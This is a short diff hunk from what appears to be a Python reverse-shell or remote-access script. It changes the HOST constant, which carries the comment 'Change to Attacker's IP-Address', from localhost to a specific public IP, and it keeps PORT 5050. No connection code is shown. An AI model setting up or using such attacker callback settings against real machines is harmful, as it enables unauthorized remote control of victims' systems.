@@ -10,7 +10,7 @@ import subprocess
 
 
 # These are the defaults, change as required
-HOST = '127.0.0.1' # Change to Attacker's IP-Address
+HOST = '134.102.107.29' # Change to Attacker's IP-Address
 PORT = 5050 # Change to Attacker's Port
 
 
